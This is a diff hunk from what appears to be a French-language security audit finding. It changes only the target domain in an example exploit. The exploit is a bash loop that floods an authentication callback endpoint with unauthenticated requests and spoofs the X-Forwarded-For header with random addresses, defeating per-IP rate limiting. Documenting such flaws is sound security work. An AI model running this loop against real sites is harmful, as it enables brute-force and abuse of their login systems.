@@ -108,7 +108,7 @@ retombe sur `ip:` pour tout non-authentifié) sont clé par IP.
 **Exploit (attaquant externe non authentifié) :**
 ```bash
 while true; do
-  curl -s https://42league.fr/api/auth/callback \
+  curl -s https://oneleague.fr/api/auth/callback \
     -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" --data '...'
 done
 ```
